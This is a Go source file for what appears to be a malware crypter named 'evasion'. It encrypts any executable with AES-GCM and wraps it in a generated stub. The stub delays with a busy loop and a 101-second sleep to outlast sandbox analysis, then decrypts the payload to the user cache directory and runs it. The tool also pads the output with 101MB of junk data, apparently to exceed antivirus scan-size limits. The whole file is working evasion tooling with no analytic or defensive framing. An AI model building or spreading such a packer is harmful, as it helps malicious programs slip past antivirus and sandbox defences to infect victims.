package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: ./evasion <path to executable>")
		return
	}

	bin, err := os.ReadFile(os.Args[1])
	if err != nil {
		log.Fatal(err)
	}

	key := make([]byte, 16)
	if _, err := io.ReadFull(rand.Reader, key); err != nil {
		log.Fatal(err)
	}

	encryptedBin, err := encryptBinary(bin, key)
	if err != nil {
		log.Fatal(err)
	}

	cacheDir, err := os.UserCacheDir()
	if err != nil {
		log.Fatal(err)
	}
	tmpPath := filepath.Join(cacheDir, "tmpfile.go")

	file, err := os.Create(tmpPath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	dummyData := make([]byte, 101*1024*1024)

	_, err = file.WriteString(evasion(encryptedBin, key))
	if err != nil {
		log.Fatal(err)
	}

	cmd := exec.Command("go", "build", "-o", "evasion-"+os.Args[1], tmpPath)
	err = cmd.Run()
	if err != nil {
		log.Fatal(err)
	}
	os.Remove(tmpPath)

	newFile, err := os.OpenFile("evasion-"+os.Args[1], os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	fmt.Printf("%v encrypted.\n", os.Args[1])

	_, err = newFile.Write(dummyData)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("101MB added to the encrypted file.")
}

func encryptBinary(bin, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("2")
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}

	encrypted := gcm.Seal(nonce, nonce, bin, nil)

	return hex.EncodeToString(encrypted), nil
}

func evasion(bin string, key []byte) string {
	return fmt.Sprintf(`
	package main

	import (
		"crypto/aes"
		"crypto/cipher"
		"encoding/hex"
		"fmt"
		"log"
		"os"
		"os/exec"
		"path/filepath"
		"strconv"
		"time"
	)


	func main() {
		counter := 0
		fmt.Println("Incrementing an int, starting from: " + strconv.Itoa(counter))
		for counter < 100001 {
			counter++
		}
		fmt.Println("Incrementing finished, final value: " + strconv.Itoa(counter))

		sleepTime := 101
		fmt.Println("Sleeping for " + strconv.Itoa(sleepTime) + " seconds...")
		start := time.Now()
		for i := 0; i <= sleepTime; i++ {
			if (i%%10 == 0 && i != 0) || i == sleepTime {
				fmt.Println("Slept for " + strconv.Itoa(i) + " seconds")
			}
			time.Sleep(1 * time.Second)
		}
		if time.Since(start) >= time.Duration(sleepTime) * time.Second {
			fmt.Println("Sleep finished, decrypting and executing...")
			decryptedBin, err := decryptBinary(%#v, %#v)
			if err != nil {
				log.Fatal(err)
			}
			err = runBinary(decryptedBin)
			if err != nil {
				log.Fatal(err)
			}
		}
	}
	func decryptBinary(bin string, key []byte) ([]byte, error) {
		encrypted, err := hex.DecodeString(bin)
		if err != nil {
			return nil, err
		}
	
		block, err := aes.NewCipher(key)
		if err != nil {
			return nil, err
		}
	
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return nil, err
		}
	
		nonceSize := gcm.NonceSize()
		nonce, encrypted := encrypted[:nonceSize], encrypted[nonceSize:]
	
		decrypted, err := gcm.Open(nil, nonce, encrypted, nil)
		if err != nil {
			return nil, err
		}
	
		return decrypted, nil
	}
	
	func runBinary(data []byte) error {
		cacheDir, err := os.UserCacheDir()
		if err != nil {
			return err
		}
		tmpPath := filepath.Join(cacheDir, "tmpexec.exe")
		os.Remove(tmpPath)

		err = os.WriteFile(tmpPath, data, 0755)
		if err != nil {
			return err
		}

		cmd := exec.Command(tmpPath)
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr

		err = cmd.Run()
		if err != nil {
			return err
		}
		os.Remove(tmpPath)
		return nil
	}
	`, bin, key)
}
